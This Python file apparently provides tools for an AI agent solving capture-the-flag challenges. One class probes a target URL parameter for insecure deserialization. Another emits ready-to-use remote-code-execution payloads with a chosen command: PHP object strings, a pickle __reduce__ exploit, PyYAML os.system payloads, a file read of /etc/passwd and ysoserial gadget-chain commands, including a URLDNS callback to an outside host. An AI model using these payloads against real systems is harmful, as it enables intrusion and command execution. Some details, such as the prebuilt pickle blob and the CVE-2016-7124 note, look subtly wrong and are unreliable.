"""
Insecure Deserialization detection and payload generation tools for CTF solving.

Provides utilities for detecting insecure deserialization vulnerabilities across
PHP, Python, Java, and .NET applications, and generating exploitation payloads.
"""

import json
import re
from typing import Dict, List, Optional, Tuple
import requests


class DeserializationProbeTool:
    """
    DeserializationProbeTool: detect insecure deserialization vulnerabilities.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "url": "http://target.com/page",
          "param": "data",
          "method": "GET",                  # or "POST" (default: "GET")
          "data": {"other": "value"},       # optional extra form data
          "format": "auto",                 # php, python, java, dotnet, auto (default: "auto")
          "timeout": 10                     # optional timeout in seconds
        }

    The tool analyzes responses for deserialization indicators and sends
    format-specific malformed payloads to detect error differentials.
    """

    name: str = "deserialization_probe"
    description: str = (
        "Detect insecure deserialization vulnerabilities. Input must be JSON with "
        "'url' and 'param' (parameter to test). Optionally provide 'method' (GET/POST), "
        "'data' for extra form fields, 'format' (php/python/java/dotnet/auto), and 'timeout'. "
        "The tool injects malformed serialized payloads and analyzes responses for "
        "deserialization indicators and error differentials."
    )

    # Detection indicators by format
    PHP_INDICATORS: List[str] = [
        "unserialize()", "O:4:", "O:8:", 's:N:"', "__wakeup", "__destruct", "a:N:{"
    ]

    PYTHON_INDICATORS: List[str] = [
        "pickle", "unpickle", "cPickle", "__reduce__", "cos\nsystem", "\x80\x03"
    ]

    JAVA_INDICATORS: List[str] = [
        "rO0AB", "aced0005", "ObjectInputStream", "ClassNotFoundException",
        "java.io.Serializable", "InvalidClassException"
    ]

    DOTNET_INDICATORS: List[str] = [
        "__VIEWSTATE", "ObjectStateFormatter", "LosFormatter",
        "BinaryFormatter", "AAEAAAD"
    ]

    # Malformed payloads per format for error differential testing
    MALFORMED_PAYLOADS: Dict[str, List[Tuple[str, str]]] = {
        "php": [
            ('O:1:"a":0:{}', "Valid but unexpected PHP object"),
            ('a:1:{s:1:"a";s:1:"b";}', "Valid PHP array"),
            ('O:9999:"x":0:{}', "PHP object with large class name length"),
            ("s:5:broken", "Truncated PHP serialized string"),
        ],
        "python": [
            ("gASVBwAAAAAAAACMAmlkAA==", "Benign base64 pickle payload"),
            ("\x80\x03X\x02\x00\x00\x00id", "Truncated pickle data"),
            ("gASVAAAAAAAA", "Malformed base64 pickle"),
        ],
        "java": [
            ("rO0ABXNyAA", "Truncated Java serialized object"),
            ("aced00057372", "Partial Java serialization hex"),
            ("rO0ABXNyABNqYXZhLnV0aWwuSGFzaE1hcA==", "Java HashMap stub"),
        ],
        "dotnet": [
            ("AAEAAAD/////", "Truncated .NET binary format"),
            ("AAEAAAD/////AQAAAA==", "Partial .NET BinaryFormatter payload"),
        ],
    }

    # Flag patterns to check for in responses
    FLAG_PATTERNS: List[str] = [
        "flag{", "FLAG{", "CTF{", "ctf{", "picoCTF{", "HTB{",
    ]

    def __init__(self, session: Optional[requests.Session] = None):
        self.session = session or requests.Session()

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[DeserializationProbeTool] Error: tool_input must be JSON. Decoding failed with: {exc}"

        url = data.get("url", "").strip()
        param = data.get("param", "").strip()
        method = data.get("method", "GET").upper()
        extra_data = data.get("data", {})
        fmt = data.get("format", "auto").lower()
        timeout = data.get("timeout", 10)

        if not url:
            return "[DeserializationProbeTool] Error: 'url' is required."
        if not param:
            return "[DeserializationProbeTool] Error: 'param' is required."
        if method not in ["GET", "POST"]:
            return f"[DeserializationProbeTool] Error: 'method' must be GET or POST, got '{method}'."

        valid_formats = ["php", "python", "java", "dotnet", "auto"]
        if fmt not in valid_formats:
            return (
                f"[DeserializationProbeTool] Error: 'format' must be one of "
                f"{', '.join(valid_formats)}, got '{fmt}'."
            )

        try:
            return self._probe_deserialization(url, param, method, extra_data, fmt, timeout)
        except requests.RequestException as e:
            return f"[DeserializationProbeTool] Request error: {e}"
        except Exception as e:
            return f"[DeserializationProbeTool] Error: {e}"

    def _make_request(
        self,
        url: str,
        method: str,
        param: str,
        payload: str,
        extra_data: dict,
        timeout: int,
    ) -> requests.Response:
        """Make request with payload injected into parameter."""
        if method == "GET":
            params = {param: payload, **extra_data}
            return self.session.get(url, params=params, timeout=timeout)
        else:
            form_data = {param: payload, **extra_data}
            return self.session.post(url, data=form_data, timeout=timeout)

    def _check_indicators(self, text: str, indicators: List[str]) -> List[str]:
        """Check text for the presence of deserialization indicators."""
        found = []
        for indicator in indicators:
            if indicator in text:
                found.append(indicator)
        return found

    def _check_flags(self, text: str) -> Optional[str]:
        """Check text for CTF flag patterns."""
        for pattern in self.FLAG_PATTERNS:
            if pattern in text:
                # Try to extract the full flag
                match = re.search(
                    re.escape(pattern) + r"[^}]*}",
                    text,
                )
                if match:
                    return match.group()
                return pattern
        return None

    def _scan_response_parts(
        self, response: requests.Response, indicators: List[str]
    ) -> Dict[str, List[str]]:
        """Scan response body, cookies, and headers for indicators."""
        results: Dict[str, List[str]] = {
            "body": [],
            "cookies": [],
            "headers": [],
        }

        # Scan body
        results["body"] = self._check_indicators(response.text, indicators)

        # Scan cookies
        cookie_str = "; ".join(
            f"{k}={v}" for k, v in response.cookies.items()
        )
        results["cookies"] = self._check_indicators(cookie_str, indicators)

        # Scan headers
        header_str = " ".join(
            f"{k}: {v}" for k, v in response.headers.items()
        )
        results["headers"] = self._check_indicators(header_str, indicators)

        return results

    def _probe_deserialization(
        self,
        url: str,
        param: str,
        method: str,
        extra_data: dict,
        fmt: str,
        timeout: int,
    ) -> str:
        """Probe for insecure deserialization vulnerabilities."""
        results = []
        detected_formats = []
        all_indicators_found: Dict[str, List[str]] = {}
        error_differentials = []
        flag_found = None

        results.append("[DeserializationProbeTool] Deserialization Detection Scan")
        results.append("=" * 55)
        results.append(f"URL: {url}")
        results.append(f"Method: {method}")
        results.append(f"Parameter: {param}")
        results.append(f"Format: {fmt}")
        results.append("")

        # Step 1: Fetch baseline response
        results.append("=== Baseline Response ===")
        try:
            baseline = self._make_request(
                url, method, param, "BASELINE_TEST", extra_data, timeout
            )
            baseline_text = baseline.text
            baseline_len = len(baseline_text)
            baseline_status = baseline.status_code
            results.append(
                f"Status: {baseline_status}, Length: {baseline_len} bytes"
            )
        except Exception as e:
            return f"[DeserializationProbeTool] Error: Could not fetch baseline response: {e}"

        # Check for flags in baseline
        flag_found = self._check_flags(baseline_text)
        if flag_found:
            results.append(f"[!] FLAG FOUND in baseline: {flag_found}")

        results.append("")

        # Step 2: Scan baseline for deserialization indicators
        results.append("=== Indicator Scan ===")
        formats_to_check = (
            ["php", "python", "java", "dotnet"] if fmt == "auto" else [fmt]
        )

        indicator_map = {
            "php": self.PHP_INDICATORS,
            "python": self.PYTHON_INDICATORS,
            "java": self.JAVA_INDICATORS,
            "dotnet": self.DOTNET_INDICATORS,
        }

        for check_fmt in formats_to_check:
            indicators = indicator_map[check_fmt]
            scan_results = self._scan_response_parts(baseline, indicators)

            found_any = False
            for location, found_indicators in scan_results.items():
                if found_indicators:
                    found_any = True
                    detected_formats.append(check_fmt)
                    all_indicators_found.setdefault(check_fmt, []).extend(
                        found_indicators
                    )
                    for ind in found_indicators:
                        results.append(
                            f"[+] {check_fmt.upper()} indicator in {location}: '{ind}'"
                        )

            if not found_any and fmt != "auto":
                results.append(
                    f"[-] No {check_fmt.upper()} indicators found in baseline"
                )

        if not detected_formats and fmt == "auto":
            results.append("[-] No deserialization indicators found in baseline")

        results.append("")

        # Step 3: Send malformed payloads and check for error differentials
        results.append("=== Error Differential Testing ===")
        formats_to_test = (
            list(self.MALFORMED_PAYLOADS.keys()) if fmt == "auto" else [fmt]
        )

        for test_fmt in formats_to_test:
            if test_fmt not in self.MALFORMED_PAYLOADS:
                continue

            payloads = self.MALFORMED_PAYLOADS[test_fmt]
            for payload, desc in payloads:
                try:
                    resp = self._make_request(
                        url, method, param, payload, extra_data, timeout
                    )

                    # Check for flag in response
                    resp_flag = self._check_flags(resp.text)
                    if resp_flag and not flag_found:
                        flag_found = resp_flag
                        results.append(f"[!] FLAG FOUND: {resp_flag}")

                    # Detect error differential
                    status_diff = resp.status_code != baseline_status
                    length_diff = abs(len(resp.text) - baseline_len) > 50

                    # Check for deserialization-specific error messages
                    deser_errors = [
                        "unserialize", "deserializ", "unpickl", "pickle",
                        "ObjectInputStream", "ClassNotFound",
                        "InvalidClass", "StreamCorrupted",
                        "BinaryFormatter", "SerializationException",
                        "TypeError", "ValueError", "EOFError",
                    ]
                    error_in_resp = [
                        e for e in deser_errors if e.lower() in resp.text.lower()
                    ]

                    if status_diff or length_diff or error_in_resp:
                        differential_info = []
                        if status_diff:
                            differential_info.append(
                                f"status {baseline_status}->{resp.status_code}"
                            )
                        if length_diff:
                            differential_info.append(
                                f"length {baseline_len}->{len(resp.text)}"
                            )
                        if error_in_resp:
                            differential_info.append(
                                f"errors: {', '.join(error_in_resp)}"
                            )

                        diff_str = "; ".join(differential_info)
                        error_differentials.append((test_fmt, desc, diff_str))
                        results.append(
                            f"[+] {test_fmt.upper()} differential ({desc}): {diff_str}"
                        )

                except Exception as e:
                    results.append(f"[!] Error testing {test_fmt} ({desc}): {e}")

        if not error_differentials:
            results.append("[-] No error differentials detected")

        results.append("")

        # Summary
        results.append("=== Summary ===")
        if detected_formats or error_differentials:
            results.append("[!] POTENTIAL DESERIALIZATION VULNERABILITY DETECTED")

            if detected_formats:
                unique_formats = sorted(set(detected_formats))
                results.append(f"[*] Format(s) detected: {', '.join(unique_formats)}")

            if all_indicators_found:
                results.append("[*] Indicators found:")
                for ifmt, inds in all_indicators_found.items():
                    results.append(f"    {ifmt.upper()}: {', '.join(set(inds))}")

            if error_differentials:
                results.append("[*] Error differentials:")
                for efmt, edesc, ediff in error_differentials:
                    results.append(f"    {efmt.upper()} ({edesc}): {ediff}")

            if flag_found:
                results.append(f"[!] FLAG: {flag_found}")
        else:
            results.append("[-] No deserialization vulnerabilities detected")
            results.append("[*] Consider:")
            results.append("    1. Testing different parameters")
            results.append("    2. Checking cookies and hidden form fields")
            results.append("    3. Looking for base64-encoded serialized data")
            results.append("    4. Trying a specific format instead of 'auto'")

        return "\n".join(results)


class DeserializationPayloadGenerator:
    """
    DeserializationPayloadGenerator: generate deserialization exploitation payloads.

    Tool interface (FAIR-style):
      - `name` and `description` class attributes.
      - `.use(tool_input: str) -> str`, where tool_input is JSON.

    Expected JSON tool_input format:

        {
          "operation": "php_payloads",       # php_payloads, python_payloads,
                                              # java_references, detection_tips
          "command": "id",                    # optional: command for RCE payloads
          "format": "all"                     # optional: filter format for detection_tips
        }

    Generates exploitation payloads and references for insecure deserialization.
    """

    name: str = "deserialization_payload_generator"
    description: str = (
        "Generate insecure deserialization payloads and references. Input must be JSON with "
        "'operation' (php_payloads/python_payloads/java_references/detection_tips). Optionally "
        "provide 'command' for RCE payloads (default 'id'). Returns ready-to-use payloads, "
        "gadget chain references, and detection guidance."
    )

    VALID_OPERATIONS: List[str] = [
        "php_payloads",
        "python_payloads",
        "java_references",
        "detection_tips",
    ]

    def use(self, tool_input: str) -> str:
        # Parse JSON input
        try:
            data = json.loads(tool_input) if tool_input else {}
        except json.JSONDecodeError as exc:
            return f"[DeserializationPayloadGenerator] Error: tool_input must be JSON. Decoding failed with: {exc}"

        operation = data.get("operation", "").lower().strip()
        command = data.get("command", "id")
        fmt = data.get("format", "all").lower()

        if not operation:
            ops = ", ".join(self.VALID_OPERATIONS)
            return (
                f"[DeserializationPayloadGenerator] Error: 'operation' is required. "
                f"Valid operations: {ops}"
            )

        if operation not in self.VALID_OPERATIONS:
            ops = ", ".join(self.VALID_OPERATIONS)
            return (
                f"[DeserializationPayloadGenerator] Error: Unknown operation '{operation}'. "
                f"Valid operations: {ops}"
            )

        if operation == "php_payloads":
            return self._php_payloads(command)
        elif operation == "python_payloads":
            return self._python_payloads(command)
        elif operation == "java_references":
            return self._java_references(command)
        elif operation == "detection_tips":
            return self._detection_tips(fmt)

        return "[DeserializationPayloadGenerator] Error: Unexpected state."

    def _php_payloads(self, command: str) -> str:
        result = [
            "[DeserializationPayloadGenerator] PHP Deserialization Payloads",
            "=" * 55,
            "",
        ]

        # POP chain templates
        result.append("=== POP Chain Templates ===")
        result.append("")
        result.append("--- __wakeup Magic Method ---")
        result.append('O:8:"Exploiter":1:{s:4:"cmd";s:' + str(len(command)) + ':"' + command + '";}')
        result.append("Note: __wakeup() is called automatically when unserialize() is invoked.")
        result.append("")

        result.append("--- __destruct Magic Method ---")
        result.append('O:10:"FileWriter":2:{s:8:"filename";s:9:"/tmp/pwnd";s:4:"data";s:' + str(len(command)) + ':"' + command + '";}')
        result.append("Note: __destruct() is called when the object is destroyed (end of script).")
        result.append("")

        result.append("--- __toString Magic Method ---")
        result.append('O:9:"Formatter":1:{s:6:"output";s:' + str(len(command)) + ':"' + command + '";}')
        result.append("Note: __toString() is called when the object is used as a string.")
        result.append("")

        # File read
        result.append("=== File Read Payload ===")
        result.append('O:13:"SplFileObject":1:{s:8:"\\x00*\\x00file";s:11:"/etc/passwd";}')
        result.append("Note: SplFileObject can read files when deserialized in some PHP versions.")
        result.append("")

        # CMS gadget chain references
        result.append("=== Common CMS Gadget Chains ===")
        result.append("")
        result.append("--- Laravel ---")
        result.append("- PendingBroadcast -> Dispatcher -> system()")
        result.append("- Use: phpggc Laravel/RCE1 system '" + command + "'")
        result.append("")
        result.append("--- WordPress ---")
        result.append("- WP_Theme -> WP_Filesystem_Direct -> file operations")
        result.append("- PHPMailer chain for email-based RCE")
        result.append("")
        result.append("--- Symfony ---")
        result.append("- Symfony/RCE chains via phpggc")
        result.append("- Use: phpggc Symfony/RCE4 exec '" + command + "'")
        result.append("")

        # Serialized object format
        result.append("=== PHP Serialization Format Reference ===")
        result.append("O:N:\"ClassName\":P:{properties}  - Object with N-char class name, P properties")
        result.append("s:N:\"value\"                      - String of length N")
        result.append("i:N                               - Integer N")
        result.append("b:0 / b:1                         - Boolean false/true")
        result.append("a:N:{key;value;...}               - Array with N elements")
        result.append("N;                                 - NULL")
        result.append("")

        result.append("=== Tips ===")
        result.append("1. Use phpggc (https://github.com/ambionics/phpggc) for framework-specific chains")
        result.append("2. Look for unserialize() calls in source code")
        result.append("3. PHP 7+ restricts some __wakeup exploitation via CVE-2016-7124 bypass")
        result.append("4. Check for phar:// deserialization (no unserialize() needed)")

        return "\n".join(result)

    def _python_payloads(self, command: str) -> str:
        result = [
            "[DeserializationPayloadGenerator] Python Deserialization Payloads",
            "=" * 55,
            "",
        ]

        # Pickle RCE via __reduce__
        result.append("=== Pickle RCE via __reduce__ ===")
        result.append("")
        result.append("--- Python Script to Generate Pickle Payload ---")
        result.append("```python")
        result.append("import pickle")
        result.append("import base64")
        result.append("import os")
        result.append("")
        result.append("class Exploit:")
        result.append("    def __reduce__(self):")
        result.append(f"        return (os.system, ('{command}',))")
        result.append("")
        result.append("payload = base64.b64encode(pickle.dumps(Exploit())).decode()")
        result.append("print(payload)")
        result.append("```")
        result.append("")

        # Base64 pickle payloads for common commands
        result.append("=== Pre-built Base64 Pickle Payloads ===")
        result.append("")
        result.append(f"--- Command: {command} ---")
        result.append("Generate with: python3 -c \"import pickle,base64,os; "
                       f"print(base64.b64encode(pickle.dumps(type('X',(),{{'__reduce__':lambda s:(os.system,('{command}',))}})())).decode())\"")
        result.append("")
        result.append("--- Command: id ---")
        result.append("gASVHgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==")
        result.append("")
        result.append("--- Command: whoami ---")
        result.append("Generate: python3 -c \"import pickle,base64,os; print(base64.b64encode(pickle.dumps(type('X',(),{'__reduce__':lambda s:(os.system,('whoami',))})())).decode())\"")
        result.append("")

        # YAML deserialization
        result.append("=== YAML Deserialization (PyYAML) ===")
        result.append("")
        result.append("--- !!python/object/apply:os.system ---")
        result.append(f"!!python/object/apply:os.system ['{command}']")
        result.append("")
        result.append("--- !!python/object/new:subprocess.check_output ---")
        result.append(f"!!python/object/new:subprocess.check_output [['{command}'], {{shell: true}}]")
        result.append("")
        result.append("--- !!python/object/apply:subprocess.check_output ---")
        result.append(f"!!python/object/apply:subprocess.check_output [['{command}']]")
        result.append("")

        # Pickle opcode basics
        result.append("=== Pickle Opcode Basics ===")
        result.append("\\x80\\x03  - Protocol 3 header")
        result.append("c        - GLOBAL opcode (import module.name)")
        result.append("(        - MARK (start of tuple)")
        result.append("t        - TUPLE (create tuple from MARK)")
        result.append("R        - REDUCE (call callable with args)")
        result.append(".        - STOP")
        result.append("")
        result.append("Example raw pickle: cos\\nsystem\\n(S'id'\\ntR.")
        result.append("This imports os.system and calls it with 'id'")
        result.append("")

        result.append("=== Tips ===")
        result.append("1. pickle.loads() is always dangerous - no safe way to use it")
        result.append("2. Check for yaml.load() without Loader=SafeLoader")
        result.append("3. Look for base64-encoded blobs in cookies or form fields")
        result.append("4. jsonpickle and shelve are also vulnerable")

        return "\n".join(result)

    def _java_references(self, command: str) -> str:
        result = [
            "[DeserializationPayloadGenerator] Java Deserialization References",
            "=" * 55,
            "",
        ]

        # ysoserial gadget chains
        result.append("=== ysoserial Gadget Chains ===")
        result.append("")
        result.append(f"Usage: java -jar ysoserial.jar <gadget> '{command}'")
        result.append("")
        result.append("--- CommonsCollections (Apache Commons Collections) ---")
        result.append(f"java -jar ysoserial.jar CommonsCollections1 '{command}'")
        result.append(f"java -jar ysoserial.jar CommonsCollections2 '{command}'")
        result.append(f"java -jar ysoserial.jar CommonsCollections3 '{command}'")
        result.append(f"java -jar ysoserial.jar CommonsCollections4 '{command}'")
        result.append(f"java -jar ysoserial.jar CommonsCollections5 '{command}'")
        result.append(f"java -jar ysoserial.jar CommonsCollections6 '{command}'")
        result.append(f"java -jar ysoserial.jar CommonsCollections7 '{command}'")
        result.append("")
        result.append("--- Spring Framework ---")
        result.append(f"java -jar ysoserial.jar Spring1 '{command}'")
        result.append(f"java -jar ysoserial.jar Spring2 '{command}'")
        result.append("")
        result.append("--- Hibernate ---")
        result.append(f"java -jar ysoserial.jar Hibernate1 '{command}'")
        result.append("")
        result.append("--- JRMP ---")
        result.append(f"java -jar ysoserial.jar JRMPClient '{command}'")
        result.append("")
        result.append("--- Other Common Chains ---")
        result.append(f"java -jar ysoserial.jar Groovy1 '{command}'")
        result.append(f"java -jar ysoserial.jar BeanShell1 '{command}'")
        result.append(f"java -jar ysoserial.jar Jdk7u21 '{command}'")
        result.append(f"java -jar ysoserial.jar URLDNS 'http://callback.example.com'")
        result.append("")

        # Serialization format structure
        result.append("=== Java Serialization Format ===")
        result.append("Magic bytes: AC ED 00 05 (hex) / rO0AB (base64)")
        result.append("Structure:")
        result.append("  [magic] [version] [class descriptor] [object data]")
        result.append("")
        result.append("Class Descriptor:")
        result.append("  TC_OBJECT (0x73) + TC_CLASSDESC (0x72) + class name + serialVersionUID")
        result.append("")

        # Detection
        result.append("=== Detection via Content-Type ===")
        result.append("Look for these Content-Type headers:")
        result.append("  application/x-java-serialized-object")
        result.append("  application/x-java-object")
        result.append("  application/octet-stream (with Java magic bytes)")
        result.append("")

        result.append("=== Tips ===")
        result.append("1. Download ysoserial: https://github.com/frohoff/ysoserial")
        result.append("2. Try URLDNS first (no dependency needed) to confirm deserialization")
        result.append("3. Use ysoserial-modified for newer chains")
        result.append("4. Check for Java serialization in cookies, JMX, RMI, T3 protocol")
        result.append("5. Base64 encode output: java -jar ysoserial.jar CommonsCollections1 '"
                       + command + "' | base64")

        return "\n".join(result)

    def _detection_tips(self, fmt: str) -> str:
        result = [
            "[DeserializationPayloadGenerator] Deserialization Detection Tips",
            "=" * 55,
            "",
        ]

        # How to identify serialization format
        result.append("=== Identifying Serialization Format ===")
        result.append("")
        result.append("--- Magic Bytes / Signatures ---")
        result.append("PHP:    Starts with O:N: (object) or a:N:{ (array) or s:N: (string)")
        result.append("Python: Base64 decode starts with \\x80\\x03 or \\x80\\x04 (pickle protocol)")
        result.append("Java:   Base64 starts with rO0AB or hex starts with aced0005")
        result.append(".NET:   Starts with AAEAAAD or contains __VIEWSTATE")
        result.append("")

        # Common locations
        result.append("=== Common Locations for Serialized Data ===")
        result.append("")
        result.append("--- Cookies ---")
        result.append("PHP:  Look for O:N: patterns in cookie values")
        result.append("Python: Look for base64-encoded blobs (decode and check for pickle magic)")
        result.append("Java: Look for rO0AB in cookie values")
        result.append(".NET: Look for __VIEWSTATE hidden field or cookie")
        result.append("")
        result.append("--- Hidden Form Fields ---")
        result.append("Check <input type='hidden'> for serialized data")
        result.append("Common names: viewstate, data, state, session, token")
        result.append("")
        result.append("--- URL Parameters ---")
        result.append("Look for base64-encoded or URL-encoded serialized objects in query strings")
        result.append("")
        result.append("--- Request Body ---")
        result.append("Check POST body for serialized data")
        result.append("Content-Type may indicate format (application/x-java-serialized-object)")
        result.append("")

        # Indicators by format
        result.append("=== Indicators by Format ===")
        result.append("")
        result.append("--- PHP ---")
        result.append("Error messages: unserialize(), __wakeup, __destruct")
        result.append("Data pattern: O:4:\"User\":2:{s:4:\"name\";s:5:\"admin\";...}")
        result.append("Look for: phar:// wrapper usage, phpggc references")
        result.append("")
        result.append("--- Python ---")
        result.append("Error messages: pickle, unpickle, __reduce__, cPickle")
        result.append("Data pattern: Base64 blob that decodes to bytes starting with \\x80")
        result.append("Look for: pickle.loads(), yaml.load(), jsonpickle")
        result.append("")
        result.append("--- Java ---")
        result.append("Error messages: ObjectInputStream, ClassNotFoundException, InvalidClassException")
        result.append("Data pattern: rO0AB (base64) or aced0005 (hex)")
        result.append("Look for: Content-Type application/x-java-serialized-object, RMI/JNDI endpoints")
        result.append("")
        result.append("--- .NET ---")
        result.append("Error messages: BinaryFormatter, ObjectStateFormatter, SerializationException")
        result.append("Data pattern: AAEAAAD (base64), __VIEWSTATE field")
        result.append("Look for: ViewState, TypeNameHandling in JSON.NET config")
        result.append("")

        result.append("=== General Tips ===")
        result.append("1. Always decode base64 values and inspect for magic bytes")
        result.append("2. Modify serialized data and observe error messages")
        result.append("3. Use Burp Suite's Java Deserialization Scanner extension")
        result.append("4. Check for known CVEs in the application's framework")
        result.append("5. Test with benign payloads first (DNS/HTTP callback) before RCE")

        return "\n".join(result)
